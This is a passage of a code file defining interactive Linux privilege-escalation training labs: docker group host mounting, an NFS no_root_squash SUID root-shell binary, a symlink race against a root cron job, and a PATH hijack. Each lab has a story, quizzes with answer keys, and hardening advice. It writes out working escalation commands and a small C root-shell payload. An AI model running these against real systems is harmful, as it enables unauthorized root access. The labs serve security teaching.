      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /usr/local/bin/db_backup.sh',
      'mkdir -p /home/dev/bin',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
      'chmod +x /home/dev/bin/backup',
      'export PATH=/home/dev/bin:$PATH',
      'crontab -l',
      '/usr/local/bin/db_backup.sh',
      'cat /home/dev/root_flag.txt',
    ],
  },
  {
    id: 'privesc-008',
    title: 'Docker Breakout',
    description:
      'Your user is a member of the docker group. Use this membership to mount the host filesystem and read the root flag, no actual container escape needed.',
    technique: 'Docker Group',
    difficulty: 'intermediate',
    hints: [
      'Check your groups: id',
      'Members of the docker group can run docker commands, which map to the Docker daemon (root).',
      'Use: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
    story: {
      title: 'The Container Leak: Escape to the Host',
      chapters: [
        {
          id: 'ch1-groups',
          title: 'Chapter 1: Group Membership',
          narrative: `> **Valkyrie:** "Docker is powerful, and dangerous if you're in the docker group."

## Check Your Groups

\`\`\`
id
# uid=1005(trainee) gid=1005(trainee) groups=1005(trainee),999(docker)
\`\`\`

Look for \`docker\` in the groups list.

## Why the docker Group Is Basically Root

Docker works by talking to a daemon: \`dockerd\`, that runs as root. The Unix socket the daemon listens on (\`/var/run/docker.sock\`) is what makes this dangerous: by default, being in the \`docker\` group grants read/write access to that socket.

Anyone who can talk to the Docker daemon can tell it to do **anything**, and the daemon does those things as root. That includes running a container with the host's entire filesystem mounted inside it. Group membership in \`docker\` is therefore equivalent to root access on the host, wrapped in a container abstraction.`,
          triggers: [{ type: 'command', value: 'id' }],
          hint: 'Check groups: id',
          quiz: [
            {
              id: 'ch1-groups-q1',
              question: 'Why is membership in the docker group effectively equivalent to root access on the host?',
              options: [
                'Because docker binaries are setuid root',
                'Because the docker group grants read/write access to the Docker daemon socket, which runs as root and can do anything',
                'Because docker passwords are stored as root',
                'Because docker users are automatically added to sudoers',
              ],
              correctIndex: 1,
              explanation: 'Talking to the Docker daemon (root) lets you command it to do anything, including host mounts.',
            },
            {
              id: 'ch1-groups-q2',
              question: 'What can anyone who can talk to the Docker daemon ask it to do?',
              options: [
                'Only manage networking',
                'Anything, including running a container with the host filesystem mounted inside',
                'Only pull public images',
                'Only stop its own containers',
              ],
              correctIndex: 1,
              explanation: 'The daemon runs as root, so controlling it means controlling the host, including mounting / inside a container.',
            },
          ],
        },
        {
          id: 'ch2-docker',
          title: 'Chapter 2: The Docker Door',
          narrative: `> **Valkyrie:** "You're in the docker group. Let's confirm Docker access."

## Verify the Socket Works

\`\`\`
docker images
\`\`\`

If this command succeeds, we can talk to the daemon, and that's all we need.

## Containers Can Mount the Host

The dangerous primitive is the volume mount. A container can mount any host directory into itself:

\`\`\`
docker run -v /:/mnt <image> ...
\`\`\`

- \`-v /:/mnt\`, mounts the host's root (\`/\`) at \`/mnt\` inside the container.
- Inside the container, \`/mnt\` **is** the host filesystem.
- The container process runs as root (containers default to UID 0).

## The Realization

You can read: and **write**, anything on the host from inside that container. This isn't even a "container escape" in the classic sense: we never needed to break out, because the daemon granted us host access directly. The docker group membership is the vulnerability, not the container runtime.`,
          triggers: [{ type: 'command', value: 'docker' }, { type: 'output_contains', value: 'docker' }],
          hint: 'Check docker access: docker images',
          quiz: [
            {
              id: 'ch2-docker-q1',
              question: 'What does the volume mount `-v /:/mnt` do?',
              options: [
                'It maps the container\'s /mnt to an empty drive',
                'It mounts the host\'s root filesystem (/) at /mnt inside the container, making /mnt the host filesystem',
                'It creates a new empty container',
                'It unmounts the host root',
              ],
              correctIndex: 1,
              explanation: 'The -v flag mounts the host root at /mnt, so inside the container /mnt is the host filesystem.',
            },
            {
              id: 'ch2-docker-q2',
              question: 'What privilege do container processes default to, enabling host file reads?',
              options: [
                'They run as the anonymous nobody user',
                'They run as UID 0 (root) by default',
                'They run with no privileges',
                'They run as the docker daemon user',
              ],
              correctIndex: 1,
              explanation: 'Containers default to UID 0, letting them read root-only files on a mounted host filesystem.',
            },
          ],
        },
        {
          id: 'ch3-mount',
          title: 'Chapter 3: Mounting the Host',
          narrative: `> **Valkyrie:** "One command. That's all it takes."

## The One-Liner

\`\`\`
docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt
\`\`\`

## Breaking It Down

| Argument | Meaning |
|----------|---------|
| -v /:/mnt | mount host root at /mnt inside the container |
| --rm | remove the container when it exits |
| -it | interactive terminal |
| alpine | a tiny Linux image |
| chroot /mnt | change the container's root to the host filesystem |
| cat /root/flag.txt | read the flag, from the **host** |

## Why chroot Is the Key

Inside the container, \`/mnt\` is the host's \`/\`. \`chroot /mnt\` makes the container's root *become* the host root, so \`/root/flag.txt\` now resolves to the host's flag. The container runs as root (UID 0), which means it can read root-only files on the mounted host filesystem.

One command, root privileges, host filesystem. The container acted as a portal straight into the host.`,
          triggers: [{ type: 'command', value: 'docker run' }, { type: 'output_contains', value: '-v' }],
          hint: 'Mount host: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
          quiz: [
            {
              id: 'ch3-mount-q1',
              question: 'What does `chroot /mnt` accomplish inside the container in this attack?',
              options: [
                'It changes the container\'s root to the mounted host filesystem, so /root/flag.txt resolves to the host flag',
                'It deletes the host filesystem',
                'It requires the container to be run twice',
                'It switches the container to a different image',
              ],
              correctIndex: 0,
              explanation: 'chroot makes the container\'s root become the host root, so paths resolve against the host filesystem.',
            },
            {
              id: 'ch3-mount-q2',
              question: 'Why does this attack not count as a classic "container escape"?',
              options: [
                'Because containers cannot be escaped',
                'Because we never needed to break out; the daemon granted us host access directly via the volume mount',
                'Because the container never runs',
                'Because chroot prevents host access',
              ],
              correctIndex: 1,
              explanation: 'The docker group membership lets the daemon mount the host directly, no runtime breakout required.',
            },
          ],
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: Through the Container',
          narrative: `> **Valkyrie:** "The container acted as a portal to the host filesystem. The flag is ours."

## The Lesson: The docker Group = Root

Being able to run containers at all is equivalent to root on the host, because the Docker daemon runs as root and we control everything it does. In real environments:

- **Never** add untrusted users to the docker group, treat membership like root access, because it is.
- Use **rootless Docker** or Podman so the daemon doesn't run as root.
- Restrict access to the Docker socket, it's a root-equivalent endpoint, not an ordinary service.
- Implement **Docker Content Trust** and audit image sources.
- **Monitor docker group membership** and socket access logs.

The same principle applies to every privileged management socket (containerd, Kubernetes node components, systemd): any group that can talk to the daemon controls the host.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag from the mounted filesystem',
          quiz: [
            {
              id: 'ch4-flag-q1',
              question: 'What is the recommended hardening for the docker group?',
              options: [
                'Add more users to it for convenience',
                'Never add untrusted users to the docker group, since membership is equivalent to root',
                'Grant all users docker access',
                'Use it to run security scans',
              ],
              correctIndex: 1,
              explanation: 'Because docker group membership equals host root, untrusted users must never be added to it.',
            },
            {
              id: 'ch4-flag-q2',
              question: 'What broader principle does this lab illustrate about privileged management sockets?',
              options: [
                'They are harmless as long as they are not networked',
                'Any group that can talk to a privileged daemon (docker, containerd, Kubernetes, systemd) controls the host',
                'Only docker sockets are dangerous',
                'Sockets cannot be exploited by unprivileged users',
              ],
              correctIndex: 1,
              explanation: 'Access to any privileged management socket grants host control, so such access must be tightly restricted.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/group': 'docker:x:999:trainee',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ntrainee:x:1005:1005::/home/trainee:/bin/bash',
      '/home/trainee/.bash_history': 'id\ndocker images',
      '/home/trainee/docker-lab-notes.txt':
        '# Docker Group Lab\n- Your user (trainee) is in the docker group\n- Docker is installed and the daemon is running\n- You can mount the host filesystem into a container\n- Target: /root/flag.txt on the host\n- Hint: docker run -v /:/mnt --rm -it alpine chroot /mnt <command>',
      '/var/run/docker.sock': '[Docker socket, accessible by docker group]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'id',
      'docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-009',
    title: 'NFS No Root Squash',
    description:
      'An NFS share is exported with no_root_squash, allowing any client to write files as root. Create an SUID binary on the share, mount it, and execute it to gain root.',
    technique: 'NFS no_root_squash',
    difficulty: 'advanced',
    hints: [
      'Check /etc/exports for NFS share configurations.',
      'The share /srv/nfs/data is exported with no_root_squash, the root user on any client is mapped to root on the server.',
      'Create a SUID root binary on the share from the client, then execute it on the server.',
    ],
    story: {
      title: 'The Shared Leak: NFS Trust Abuse',
      chapters: [
        {
          id: 'ch1-exports',
          title: 'Chapter 1: The Exported Shares',
          narrative: `> **Valkyrie:** "NFS shares are common in enterprise environments. Let's check what's exported."

## What Is NFS?

NFS (Network File System) lets machines share directories over the network, so a client can read and write a server's files as if they were local. It's everywhere in enterprises, home directories, shared storage, backup volumes.

## Inspect the Exports

\`\`\`
cat /etc/exports
\`\`\`

The \`/etc/exports\` file defines which directories are shared, to which clients, and with which options. Those options are where the vulnerability hides. The flags after each path: \`rw\`, \`sync\`, \`no_subtree_check\`, and especially \`root_squash\` vs \`no_root_squash\`, control how much the server trusts its clients.

## The Attack Flow

\`\`\`
[Client] --mount--> [NFS Share] --write SUID--> [Server executes as root]
\`\`\`

If we can write files into an NFS share as root, and the server executes files from that share, we can place a root-owned SUID binary that the server runs with full privileges. The whole attack lives in the export options.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'exports' }],
          hint: 'Check exports: cat /etc/exports',
          quiz: [
            {
              id: 'ch1-exports-q1',
              question: 'What does the /etc/exports file define on an NFS server?',
              options: [
                'The list of installed network packages',
                'Which directories are shared, to which clients, and with which options',
                'The firewall rules for incoming TCP connections',
                'The hosts that are allowed to SSH in',
              ],
              correctIndex: 1,
              explanation: '/etc/exports lists each shared directory, the allowed clients, and the export options such as rw, sync, and root_squash vs no_root_squash.',
            },
            {
              id: 'ch1-exports-q2',
              question: 'Why is the export options section the place to look for an NFS vulnerability?',
              options: [
                'Options control the filesystem format used',
                'Options like rw, sync, and no_root_squash determine how much the server trusts its clients',
                'Options set the disk quota for the share',
                'Options define which ports NFS listens on',
              ],
              correctIndex: 1,
              explanation: 'The export flags control permissions and trust levels (like whether client root is squashed), which is exactly where NFS privilege-escalation bugs hide.',
            },
          ],
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Misconfiguration',
          narrative: `> **Valkyrie:** "no_root_squash is enabled on /srv/nfs/data. This is catastrophic."

## The Squash Options

| Export option | Client root's identity on the server |
|---------------|---------------------------------------|
| root_squash | mapped to \`nobody\` (unprivileged), safe |
| no_root_squash | mapped to **root**, catastrophic |

## What "Squashing" Means

NFS clients and servers have different user databases. By default NFS applies **root_squash**: even if a client connects as root (UID 0), the server remaps that UID to the unprivileged \`nobody\` account before any file operation. This is the safety net that stops a compromised client from owning the server's share.

\`no_root_squash\` disables that net. A client that presents itself as root is trusted as root on the server, with all of the write access that implies.

## Why It's Game Over

With \`no_root_squash\`, a client can write a file to the share with ownership root and permissions that include the SUID bit. When the server later executes that file, it runs as root. We can literally drop a root shell binary onto the server's filesystem.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'no_root_squash' }],
          hint: 'The share has no_root_squash, root on client = root on server',
          quiz: [
            {
              id: 'ch2-vulnerability-q1',
              question: 'What does root_squash do by default in NFS?',
              options: [
                'It lets client root act as root on the server',
                'It maps a client root (UID 0) to the unprivileged nobody account on the server',
                'It disables all sharing on the export',
                'It encrypts NFS traffic',
              ],
              correctIndex: 1,
              explanation: 'root_squash remaps a client presenting UID 0 to the nobody account, preventing a compromised client from owning the share.',
            },
            {
              id: 'ch2-vulnerability-q2',
              question: 'Why is no_root_squash considered catastrophic?',
              options: [
                'It increases network latency on the share',
                'It trusts a client root as root on the server, allowing root-owned writes into the share',
                'It removes the SUID bit from every file',
                'It requires a password to mount the share',
              ],
              correctIndex: 1,
              explanation: 'With no_root_squash, a client root keeps root privileges on the server, creating a root write primitive that enables placing SUID binaries.',
            },
          ],
        },
        {
          id: 'ch3-exploit',
          title: 'Chapter 3: The SUID Binary',
          narrative: `> **Valkyrie:** "Write a SUID root binary to the NFS share."

## Compile and Set SUID

\`\`\`
gcc exploit_template.c -o /srv/nfs/data/rootsh
chmod +s /srv/nfs/data/rootsh
\`\`\`

## The Payload Source

The template (\`exploit_template.c\`) is a minimal C program:

\`\`\`
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
\`\`\`

## Why Each Piece Works

1. \`gcc\` compiles it into a real binary (not a script. SUID on scripts is ignored by the kernel, but it works on compiled binaries).
2. \`chmod +s\` sets the SUID bit, so any user who executes \`rootsh\` runs it with the file owner's privileges, **root**.
3. Inside, \`setuid(0)\` and \`setgid(0)\` force the identity to root, and \`system("/bin/bash -p")\` spawns the root shell.

Because the share was exported with \`no_root_squash\`, our client-side root writes this file with **root ownership** preserved on the server. That root ownership is exactly what makes the SUID bit dangerous.`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'command', value: 'chmod' }],
          hint: 'Compile and set SUID: gcc exploit_template.c -o /srv/nfs/data/rootsh && chmod +s /srv/nfs/data/rootsh',
          quiz: [
            {
              id: 'ch3-exploit-q1',
              question: 'Why must the SUID root binary be a compiled program rather than a script?',
              options: [
                'Shell scripts do not support the setuid() call',
                'Compiled binaries run faster over the network',
                'The kernel ignores the SUID bit on scripts, so they would not run with root privileges',
                'Scripts cannot call system()',
              ],
              correctIndex: 2,
              explanation: 'The kernel disregards the SUID bit on interpreter scripts, so you must compile a real binary for SUID execution to work.',
            },
            {
              id: 'ch3-exploit-q2',
              question: 'What role does chmod +s play in this attack?',
              options: [
                'It compiles the C source into a binary',
                'It sets the SUID bit so the binary runs with the file owner\'s (root) privileges',
                'It strips the binary to reduce its size',
                'It marks the file as executable on the share',
              ],
              correctIndex: 1,
              explanation: 'chmod +s sets the SUID bit, causing anyone who executes rootsh to run it with the privileges of its owner (root).',
            },
          ],
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: The Root Shell',
          narrative: `> **Valkyrie:** "Execute the SUID binary on the server."

## Detonation

\`\`\`
./rootsh
\`\`\`

## The Complete Chain

1. We wrote \`rootsh\` to the share as root (thanks to \`no_root_squash\`).
2. The file on the server is owned by root with the SUID bit set.
3. Executing it triggers \`setuid(0)\` and \`setgid(0)\`, the running process becomes root.
4. \`system("/bin/bash -p")\` spawns an interactive root shell.

Every link in this chain was a trust decision: the sysadmin trusted the client (no_root_squash), trusted the share's contents, and never audited what files appeared there. The SUID + no_root_squash combination runs our binary as root, no credentials, no exploit, no patching required.`,
          triggers: [{ type: 'command', value: './rootsh' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./rootsh',
          quiz: [
            {
              id: 'ch4-root-q1',
              question: 'What is the purpose of setuid(0) inside the SUID binary?',
              options: [
                'It sets the binary\'s file permissions to read-only',
                'It forces the running process to take on root (UID 0) identity',
                'It drops the SUID bit at runtime',
                'It connects to the NFS server',
              ],
              correctIndex: 1,
              explanation: 'setuid(0) explicitly sets the process UID to root, cementing the privileges granted by the SUID bit.',
            },
            {
              id: 'ch4-root-q2',
              question: 'What makes the entire NFS chain work without an exploit or credentials?',
              options: [
                'The SUID binary reads the flag directly from the network',
                'A series of trust decisions, chiefly the no_root_squash export, let a root-owned SUID binary run with full privileges',
                'The server has an open backdoor on port 22',
                'The client bypasses the kernel permission checks',
              ],
              correctIndex: 1,
              explanation: 'no_root_squash preserved root ownership of the written file, and the SUID bit made it run as root, with no exploit or credentials required.',
            },
          ],
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: Root Achieved',
          narrative: `> **Valkyrie:** "Root shell acquired. Read the flag."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Lesson: Never Use no_root_squash

\`no_root_squash\` completely defeats NFS security, it converts a network share into a root write primitive. Proper hardening:

- Always use **root_squash** (it is the default and exists for exactly this reason).
- Restrict exports to specific client IPs/subnets, never broad ranges.
- Export shares **read-only** where clients don't need to write.
- Audit \`/etc/exports\` for dangerous options like \`no_root_squash\` and \`insecure\`.

NFS is a trust boundary: each export option is a promise about how much you trust the client. \`no_root_squash\` promises everything, and attackers collect on that promise.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
          quiz: [
            {
              id: 'ch5-flag-q1',
              question: 'Which hardening practice best prevents this NFS attack?',
              options: [
                'Disabling the SUID bit on all files in the share',
                'Using root_squash and restricting exports to specific client IPs on a read-only basis where possible',
                'Mounting the share with encryption',
                'Setting an NFS password',
              ],
              correctIndex: 1,
              explanation: 'root_squash neutralizes client-root trust and restricting exports limits who can write, removing the root write primitive this attack depends on.',
            },
            {
              id: 'ch5-flag-q2',
              question: 'What is the core lesson about NFS export options?',
              options: [
                'Each export option is a trust boundary that determines how much the server trusts its clients',
                'Export options only affect performance, not security',
                'All exports should include no_root_squash for performance',
                'The sticky bit replaces export options',
              ],
              correctIndex: 0,
              explanation: 'Every export option is effectively a promise about client trust; no_root_squash promises everything, which attackers exploit.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/exports':
        '# /etc/exports: NFS share configuration\n/srv/nfs/data\t192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash)\n/srv/nfs/public\t192.168.1.0/24(ro,sync,subtree_check,root_squash)',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nnfsuser:x:1006:1006::/home/nfsuser:/bin/bash',
      '/home/nfsuser/nfs-notes.txt':
        '# NFS Lab Notes\n- /etc/exports shows /srv/nfs/data with no_root_squash\n- You have a client at 192.168.1.50 that can write to the share\n- Create a C program that calls setuid(0) then exec(/bin/bash)\n- Compile it on the client, set the SUID bit, then execute it on the server\n- /root/flag.txt is the target',
      '/home/nfsuser/exploit_template.c':
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n    return 0;\n}',
      '/srv/nfs/data': '[NFS share, mounted from client with no_root_squash]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/exports',
      'mount | grep nfs',
      'gcc exploit_template.c -o /srv/nfs/data/rootsh',
      'chmod +s /srv/nfs/data/rootsh',
      './rootsh',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-010',
    title: 'Sticky Bit Race',
    description:
      'A world-writable directory with the sticky bit missing contains a predictable temporary file created by a root-owned cron job. Race against the cron to replace the file with a symlink to /root/flag.txt.',
    technique: 'Sticky Bit Race Condition',
    difficulty: 'advanced',
    hints: [
      'Check /tmp/shared for files with ls -la, the sticky bit is NOT set.',
      'A cron job copies the contents of /tmp/shared/scratch.txt to a root-owned location and processes it.',
      'Replace scratch.txt with a symlink to /root/flag.txt before the cron job runs. The cron job will read the flag contents.',
    ],
    story: {
      title: 'The Race Against the Sweep: Sticky Bit Race Condition',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: The Missing Sticky Bit',
          narrative: `> **Valkyrie:** "Time for a race condition. Let's check the shared folder."

## Inspect the Directory

\`\`\`
ls -la /tmp/shared/
\`\`\`

Look for the mode: \`drwxrwxrwx\` (777), world-writable with **NO sticky bit**.

## The Sticky Bit, Explained

The sticky bit (mode \`+t\`) is the permission that tames world-writable directories. On a directory with the sticky bit (\`drwxrwxrwt\`, like \`/tmp\`), a user can only delete or rename files they own. Without it (\`drwxrwxrwx\`), **any** user can delete **any** file in the directory, regardless of ownership.

| Mode | Who can delete |
|------|----------------|
| drwxrwxrwx | anyone, any file, no protection |
| drwxrwxrwt | only the file's owner |

The missing sticky bit turns a shared directory into a manipulation surface: we can remove a file we don't own and replace it with anything we want.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'drwxrwxrwx' }],
          hint: 'Check directory permissions: ls -la /tmp/shared/',
          quiz: [
            {
              id: 'ch1-permissions-q1',
              question: 'What does the sticky bit (mode +t) do on a world-writable directory?',
              options: [
                'It makes the directory temporarily read-only',
                'It restricts deletion and renaming of files to their owners',
                'It hides the directory from ls',
                'It grants root to anyone who enters the directory',
              ],
              correctIndex: 1,
              explanation: 'On a sticky-bit directory like /tmp (drwxrwxrwt), users can only delete or rename files they own, unlike a plain drwxrwxrwx directory.',
            },
            {
              id: 'ch1-permissions-q2',
              question: 'Why is a world-writable directory without the sticky bit dangerous?',
              options: [
                'It allows any user to delete or replace any file in it, regardless of ownership',
                'It disables file encryption in that directory',
                'It lets any user read /root',
                'It removes the SUID bit from all binaries',
              ],
              correctIndex: 0,
              explanation: 'Without the sticky bit, any user can delete any file in the directory, turning it into a manipulation surface for file replacement attacks.',
            },
          ],
        },
        {
          id: 'ch2-cron',
          title: 'Chapter 2: The Predictable Cron',
          narrative: `> **Valkyrie:** "A cron job reads scratch.txt every minute and logs it. The cron runs as root."

## The Vulnerable Cron

\`\`\`
cat /etc/crontab
# * * * * * root cat /tmp/shared/scratch.txt >> /var/log/scratch.log
\`\`\`

## The Flaw

The cron job runs \`cat /tmp/shared/scratch.txt\` **as root** and appends its contents to a log. The path it reads is *predictable*, the same file, every minute. And because the directory has no sticky bit, we can replace that file at will.

## The Race Plan

1. **Delete** scratch.txt (allowed, no sticky bit).
2. **Replace** it with a **symlink** pointing at \`/root/flag.txt\`.
3. When the next cron tick runs \`cat /tmp/shared/scratch.txt\`, the shell follows the symlink: as root, and appends the flag's contents to \`/var/log/scratch.log\`.
4. We read the log, and the root-only flag leaks into a file we can access.

This is a **symlink race**: the cron job opens the path without checking that what's there now is the same thing that was there before. Root follows the link; root reads the flag; we read the log.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'scratch.txt' }],
          hint: 'Check the cron job: cat /etc/crontab',
          quiz: [
            {
              id: 'ch2-cron-q1',
              question: 'Why is this cron job vulnerable despite running a normal-looking cat command?',
              options: [
                'It is scheduled every minute, which crashes the system',
                'It reads a predictable path as root and appends it to a log, so a swapped symlink leaks root-only data into a readable log',
                'It uses the su command incorrectly',
                'It writes directly to /etc/crontab',
              ],
              correctIndex: 1,
              explanation: 'The root cron reads the same predictable file each minute; because the directory lacks a sticky bit, we can point that path at /root/flag.txt.',
            },
            {
              id: 'ch2-cron-q2',
              question: 'How does the flag end up readable by the attacker?',
              options: [
                'The cron copies the flag into the attacker\'s home directory',
                'The cron follows the attacker\'s symlink as root and appends /root/flag.txt\'s contents to a log the attacker can read',
                'The flag is stored in plaintext in the crontab',
                'The attacker reads /root/flag.txt directly',
              ],
              correctIndex: 1,
              explanation: 'When cron cats the symlinked path it runs as root, so it reads /root/flag.txt and writes the contents into /var/log/scratch.log.',
            },
          ],
        },
        {
          id: 'ch3-race',
          title: 'Chapter 3: The Race',
          narrative: `> **Valkyrie:** "The race is on! Replace the file before cron reads it."

## Swap the File

\`\`\`
rm -f /tmp/shared/scratch.txt
ln -s /root/flag.txt /tmp/shared/scratch.txt
\`\`\`

## The Timing

You have roughly 60 seconds, until the next cron tick. The race is between our \`rm\` + \`ln\` sequence and the cron's \`cat\`.

\`\`\`
BEFORE:  /tmp/shared/scratch.txt  (normal file)
AFTER:   /tmp/shared/scratch.txt -> /root/flag.txt  (symlink)
\`\`\`

When cron runs \`cat /tmp/shared/scratch.txt\`, the kernel follows the symlink and reads \`/root/flag.txt\` instead. The \`>> /var/log/scratch.log\` append is what matters: it runs as root (because the *cron* process is root), so the flag's contents, which we could never read directly, get written into a log file that we *can* read.

## Why rm First?

If \`scratch.txt\` already exists, \`ln -s\` would fail (\`File exists\`). The \`rm -f\` clears the way. Deleting someone else's file is exactly what the missing sticky bit permits, and exactly what the sticky bit is designed to prevent.`,
          triggers: [{ type: 'command', value: 'rm' }, { type: 'command', value: 'ln' }],
          hint: 'Create symlink: rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
          quiz: [
            {
              id: 'ch3-race-q1',
              question: 'Why must scratch.txt be removed (rm -f) before creating the symlink?',
              options: [
                'To free up disk space in /tmp/shared',
                'Because ln -s would fail with "File exists" if the target path is already present',
                'To stop the cron from reading the original file',
                'To set the SUID bit on the directory',
              ],
              correctIndex: 1,
              explanation: 'ln -s refuses to overwrite an existing path, so the file must be deleted first; the missing sticky bit makes this deletion possible.',
            },
            {
              id: 'ch3-race-q2',
              question: 'What happens when the root cron runs cat on the symlinked scratch.txt?',
              options: [
                'The shell refuses to follow the symlink',
                'The kernel follows the symlink and reads /root/flag.txt as root, appending its contents to the log',
                'The cron deletes the symlink',
                'The cron writes the flag back to the attacker',
              ],
              correctIndex: 1,
              explanation: 'cat follows the symlink; because the cron process is root, it reads the root-only flag and appends it to a log the attacker can read.',
            },
          ],
        },
        {
          id: 'ch4-wait',
          title: 'Chapter 4: Waiting for the Cron',
          narrative: `> **Valkyrie:** "The trap is set. Wait for the cron to trigger."

## Wait for the Tick

\`\`\`
sleep 65
\`\`\`

The cron job runs every 60 seconds. Sleeping for 65 seconds guarantees we cross at least one full cycle, after that, the log has been appended.

## What a "Race Condition" Really Means

A race condition is a window where the *state* of a resource changes between two operations that assume it stayed the same. The cron assumes \`/tmp/shared/scratch.txt\` is a harmless data file; we swap it for a symlink inside that window. The result depends on ordering, did our swap land before the cron's \`cat\`? If yes, we win. If the cron fires first, we simply wait for the next minute and try again.

Race conditions are subtle because the vulnerable code looks entirely normal, reading a file and logging it. The danger is in the assumptions: that the file is what it was, and that nobody else can touch the directory.`,
          triggers: [{ type: 'command', value: 'sleep' }],
          hint: 'Wait for cron: sleep 65',
          quiz: [
            {
              id: 'ch4-wait-q1',
              question: 'Why does the attacker sleep for 65 seconds?',
              options: [
                'To let the system cool down after the exploit',
                'To guarantee crossing at least one 60-second cron cycle so the log gets appended',
                'To wait for the network to reconnect',
                'To give the sticky bit time to apply',
              ],
              correctIndex: 1,
              explanation: 'The cron runs every 60 seconds, so sleeping 65 seconds ensures the cat fires at least once against the swapped symlink.',
            },
            {
              id: 'ch4-wait-q2',
              question: 'What is a race condition in this context?',
              options: [
                'A crash that happens when two processes write the same file',
                'A window where the state of a resource changes between two operations that assumed it stayed the same',
                'A scheduling priority setting in cron',
                'A network packet collision on the share',
              ],
              correctIndex: 1,
              explanation: 'The race is between our rm + ln swap and the cron\'s cat; if the swap lands first, we win and the flag is appended to the log.',
            },
          ],
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Flag in the Log',
          narrative: `> **Valkyrie:** "The cron followed our symlink and leaked the flag into the log."

## Capture the Flag

\`\`\`
cat /var/log/scratch.log
\`\`\`

The flag appears in the log because the root cron appended \`/root/flag.txt\`'s contents into it.

## The Lessons

- **Always set the sticky bit** on shared directories. \`/tmp\`, \`/var/tmp\`, and any shared workspace should be \`drwxrwxrwt\`, not \`drwxrwxrwx\`.
- **Validate symlink targets** before processing files. A script that follows a path under a shared directory must check it's not a symlink (e.g., \`readlink\` or \`stat\`), or process the file in a directory only root can modify.
- **Race conditions are subtle but devastating.** This whole compromise needed no exploit, no credentials, and no patching, just a missing permission bit and a predictable filename. Defenders should treat every root process that touches a world-writable path as an attack surface.`,
          triggers: [{ type: 'file_access', value: '/var/log/scratch.log' }],
          hint: 'Read the log: cat /var/log/scratch.log',
          quiz: [
            {
              id: 'ch5-flag-q1',
              question: 'Which defensive measure best prevents this symlink race?',
              options: [
                'Setting the sticky bit on shared directories so users cannot delete others\' files',
                'Running the cron every 60 seconds to out-race attackers',
                'Storing the flag outside /root',
                'Removing the SUID bit from cron',
              ],
              correctIndex: 0,
              explanation: 'The sticky bit prevents deleting others\' scratch.txt, so the attacker could never perform the rm + ln swap in the first place.',
            },
            {
              id: 'ch5-flag-q2',
              question: 'What is the key takeaway about this whole compromise?',
              options: [
                'It required a patched kernel exploit to succeed',
                'No exploit, credentials, or patching was needed, just a missing permission bit and a predictable filename',
                'It depended on an open SSH port',
                'It required physical access to the server',
              ],
              correctIndex: 1,
              explanation: 'A missing sticky bit plus a predictable cron path produced a root read with no exploit or credentials, showing how subtle permission configs are.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root\tcat /tmp/shared/scratch.txt >> /var/log/scratch.log',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nuser:x:1007:1007::/home/user:/bin/bash',
      '/tmp/shared/scratch.txt': 'default temp data, overwritten by cron',
      '/tmp/shared/': '[world-writable directory, drwxrwxrwx - NO sticky bit]',
      '/var/log/scratch.log': '[cron appends contents of scratch.txt here]',
      '/home/user/race-notes.txt':
        '# Sticky Bit Race Lab\n- /tmp/shared has NO sticky bit, any user can delete any file\n- A cron job reads /tmp/shared/scratch.txt every minute\n- Replace scratch.txt with a symlink to /root/flag.txt\n- Then check /var/log/scratch.log for the flag contents\n- Race condition: delete and recreate before cron reads it',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /tmp/shared/',
      'cat /etc/crontab',
      'rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
      'sleep 65',
      'cat /var/log/scratch.log',
    ],
  },
];
